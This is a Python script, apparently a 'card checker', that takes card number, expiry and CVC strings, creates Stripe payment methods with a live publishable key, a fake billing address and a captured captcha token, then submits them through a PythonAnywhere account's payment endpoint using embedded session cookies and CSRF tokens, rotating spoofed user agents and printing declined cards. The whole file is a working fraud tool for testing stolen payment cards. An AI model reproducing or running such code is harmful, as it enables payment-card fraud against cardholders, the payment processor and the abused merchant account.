import requests
import time
import user_agent
from user_agent import generate_user_agent
user_agent = generate_user_agent()
import requests
import pyfiglet
import os
import random

user_agent = random.choice(['Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 NewsSapphire/23.7.401202602',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/330.0.0.12.116;]',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.0.0.24.107;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Safari/537.36 OPR/71.0.3718.67035',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]',
'Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344',
'Mozilla/5.0 (Linux; Android 11; Redmi note 10 Pro ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36'
])

def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	
	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
}
	data = f'type=card&billing_details[name]=Grace+Schamberger&billing_details[address][line1]=3520+Hughes+Ave&billing_details[address][line2]=3521+Hughes+Ave&billing_details[address][city]=Los+Angeles&billing_details[address][postal_code]=90034&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4aabf1a-b52c-400a-930a-d71ae0eb8e8592ab0e&muid=632e28f6-f7e2-4f41-9540-bdeb69c3db06d2e427&sid=74bca82b-a1a2-4fac-bafb-a3a5324672084ce084&pasted_fields=number&payment_user_agent=stripe.js%2Fb2259399ca%3B+stripe-js-v3%2Fb2259399ca%3B+split-card-element&referrer=https%3A%2F%2Fwww.pythonanywhere.com&time_on_page=124151&key=pk_live_ECdoUHKMCDhZOSh2bJLLfBGa&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNllKVkRoZnMzU3lGTXpjSlhUdlhHeWdqOVhvN0dxY3VoZ0EwOWpBYWNGWjhkZGdWTXVtMXN6RXJpTzBJUzBxTHRFaFZrYThGY1QrcWpCNFpLZVpyemRqazdIVFdKK282Z1d5QWp5d0JNdG9nVGZYQkttU09MUmcyRjk4ZXhwSzdsbUpYSVNHMW83R3FjUW95TnF4UHVhTytFVXZZSXA4SzNKUFYxQ0U0a0pkMUhmSWhBcHZ3M2dVQzFSN1BkaVBJaGlESUIxZDFPeDZ6Qm01UUdhM2FXWk1TbjhScDVyWWlma2ZJN1R6RFE2V1kraVlDb0ppbkxoZTNxVlJZWlgzdEJMN0psZ0JMRlRWaXNUbGpaTWJtTzJaVzRDWCs2WTRXc05kTlhmSk1aZ0h2NSt4bXR6ZzhMMjJXU3FSMEpzRzk0SnJLVHpuU3N6dWp4UUVnTHJrWEhKazMwUStXdFJ1VkFvY2d2ZldoN1dOL1YvM1FaRnQ2ajJBWXp4THIzY00xM2NlcnFvQkR4MWRDVjZuVlgrL2owUlVRcENSVWRUaXpmMjJKZzEzd1hzT3FNcnNlQnRBek1SMDk5MkhJbWhBSms3TXp6a1RzU1hZNUY4c21PMUZzbWJTYWxhbDROQTNEd3NjRFMwZFlpelZiMHJleWI2YjhVdjhOalh6d2lpMkJzNTg2a2hnVThPVnlmaXdUNlhmL1owT2loVTAvZnAwT3FYRHlxUGVWd3ZYdkxmdnVPalNGSEtFUGJOTmNqRW1OeUY0bUZUT2xjZWJsaEFKTjM0RDFVdmZjWDBCUXRJaURXTmVMaHpHZUo0MWtQV3VyQ2JYS3NLQ0hDdHRpTCtFS2ZDVXRLSkFrT3NzS3kxTFNCaGx0OWlEam5PYTBSNm53ZW91RXRwMzZKdm9takk4Y0xtNDFJM1dZUDd0dEpYaGhsLzMvVmdiVzJibVBnV2Z4UVhjVHRlNWRnU1pWdE44K1NQMG42Z1NwM1FuMWd2WE5ocGJCSUlkb2JOQkY0ZFlVUVBZTGJZOUxvMm1kWTV3MEovNExiSzdYRWZneHo1L0xmSW9ESVNaTHJNUHFFNkZvR3dBUlo3cnEzUGZDU3kyZHhoYVVRMUl5d1JBa0c3bnhjQUFpMm4ySndBL0NCd2xXaThsVGcwWDdDZHI0SWZYOHY4czZveEpsQjF0bURDaWNMbjZaWDB1MEJqODVWRVlMYnF4VDY2QzVmY1JTOStnZUoxM0J0VkMzNzlEdWR4YzBSZ1c0VkRKbk0xS2h5T1B3RGNBeVFhRUNZRnBwTWxxZkxTVy9ya05aYjNXODYyYUk1dFZ3V3hnUmZ0dnd2QWc3REFSVXFoYXFRNnpQd3hpa1o4U2NieEd2RU1XTGV0SkVXaWNnRnJvU3FWUmxWOU9IMXl4WjhCRDV5SEt6Q2RoUXZBODdUZ2VWcU9vL2llU1NLS2tMT3NuTEY4NlovMU9CckZGOVVxWkEzSzdZaE1GZjBsVjhqZVpCdVprZnhVOU9VZGlnMGlVWkZsTkFGNXlUQ3AvUk9zcTdSTjBDZjFlYWRJRVZnL1NIWG4wbWM3UFpXU3hJRGpYZW0remxZUTVZK2xoL3k0V1ZqODBFLyttVDdNTVU1MGhzcDBYV0JocXZYcjE5NDRGVjVGVG9sNkNoZHlpdndia2ZxdmRkOW1GNFFLVERIcGNCYWI3ZG9vMDM0L085QmhjcWZlRXk5c0V3R2JZc3FCZkVZNHZoVFZ1N1FCekVtdkg4dDBpOHg5aVQ3UjVwcFhiZVlRY2QzeWNvd29aeGpHVk5KWmNWQnA4dzhoK0pCd2tTSlhBYTdKa0xsQmtybVFwNE1PMmZhUjNTaEVLSXJYL0EyWTh3a0F5K1p6bFpUWGRXN2twK0dRVWU4UlVoZ1VIeTZFbGphSHlTVjY4dXVpVjJGSUx2WUZUbjdBWlRzRFlDUXczaUhoMnZ1NFQwbmozcTBIUXBTNnlWVm1sNCt5dHZBWFlURVhPbGhlcE9vS2dmbjBCU010ODFDZDhMQ3d6VWwzWStZcXZrUW5qSHd3ZklPN1JUZ1p6d2xhb0xrVXlUVUdOVG45T3NCUHMwY0dZVmE5WmRsd1g1R3dZNGVkY3NVeE1pTUd3MElGQ0lPU1c3Z3Z5aWRyRVROUFhSajhWL0h2K0E2ei82WGM0ai95akg2MDR6SlFLY3lBRXNOQk9JeUtVZW5xQ3gyQ2Y1cjltRXZQZ1RjSDRMRGM2dWRXc3ZzKzY2aTJjSnVMTms4Y2psT1cvbU1NZEhvUXd5dEQ2TDJNL1hwWEJKRlF1ZEE4VENhVEtaT2lkajhISFFxUzg3djYya0E1N2xTdDVjbDh1VmZHU0FYL2J2WURDelNEVGl3MXRxOVBSZXVEeG5Wa2ExQm1UaWpRc0RUTVFkMXVuaUJIWGhlK0JmTGRSNXpvYkgrVkdxaUpwb1F1blUwbG40ZlhIb280OXRmM2QwaUxIc3JXODJMMmFON2hJNVN4d0tYWlpEQTcrQXpLcjZSTUxBY0Yxem4wMGw5czJaemIvaWdPL1hiTmppVnpVMzZFaHkrU3AxRWFuYzhVV3IrbW40WlhEUVo1Yld2QWk4ZTBabjJKZ2t1Q2hhVVFON0k5bVdJUXdFRkh2WWxYUklneDJHMzQybEV0dThEaTF3RzJhNDV1clNOdnM2ZW82Kzc1c1pSTTRwN2RvMk16RUJYbllOTjNJcjU5dVE2V2kzOSs3bGQwcUVHd1ZWTlhoK25lTWtrNVZTa3VjdkhZdU5uKzRLdHBtQnEwNVpKTVRiMlhYclM2SWVXZTBZTUJzSzdaWmV3cjI4WFMreFFWRlNBeHpVb1ZIUSt3VmVZVDBPWVhqRENqc0x5dzRsSWJ6em5QTVE2U3FJVHlad3Q4dlU1VVlINWhWU3lJRWlWMDFJeElzWXJRbm1BR3lzMjlCNVBhbUFpUVhBcHhOU0E1NVFxak9xWEE9PSIsImV4cCI6MTcyNjY4NzExNywic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjM3OTk2N2ZjIiwicGQiOjAsImNkYXRhIjoiTDlOUXpsWkRzcWNWL1VVaG5aRm9DRm5qZ2hlZEIwZld6OWJZbTdqQkYyc3RjdkI4aGNiSjcxWWlHSDFpMU4xN1lCNFUvY0hOSWNCaTJJc2RmRHdsRENUMWowZTIwcE9Ud1NNRmljZHUvUUtHN241Y1VXQ0VWUzhWVno4NHFhWDJ2V1Znbkp3VDhpamYvQlNIeFB0alVGb0NhSjk5dnZUZ1Y2V21vb1VJdXE0bWdkamNMbW83eENhYmNFMW1wZk1mc3paUEZldDZqWlcyRDVwcSJ9.gC-uI8AdrYMvhXN5hRrxhqAr1gn6kWDVVJmfxYInNgE'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data);id = response.json()['id']
    
	cookies = {
    'cookie_warning_seen': 'True',
    '_ga': 'GA1.1.813739989.1726686725',
    'csrftoken': 'wd2XBvedAeICHB28oxgAzYyZlJKNXEjwIlImTYiXURqPXcKsYSyrsBOfBdfeVz46',
    'sessionid': '9oqk5lzffx7ke65jku47ql7h1fspkecx',
    '_ga_DHJF51F24N': 'GS1.1.1726686725.1.1.1726686890.0.0.0',
    '__stripe_mid': '632e28f6-f7e2-4f41-9540-bdeb69c3db06d2e427',
    '__stripe_sid': '74bca82b-a1a2-4fac-bafb-a3a5324672084ce084',
}

	headers = {
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.pythonanywhere.com',
    'Referer': 'https://www.pythonanywhere.com/user/tigermno/account/stripe_enter_card_data',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': user_agent,
    'X-CSRFToken': 'YemZYWGI01lrjIWtxwhG09Ruy9I5luToam2ogpKskE3EzjEN7RzxTM7KODdwjpEY',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	json_data = {
    'payment_method_id': id,
}

	response = requests.post(
    'https://www.pythonanywhere.com/user/tigermno/account/stripe_save_payment_details',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
	msg = str(response.text)

	return (msg)

	if "nextPageURL" in msg:
		return 
	elif "Your card was declined" in msg:
		print(f'{n}|{mm}|{yy}|{cvc}'' ➜ ', '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌');time.sleep(10)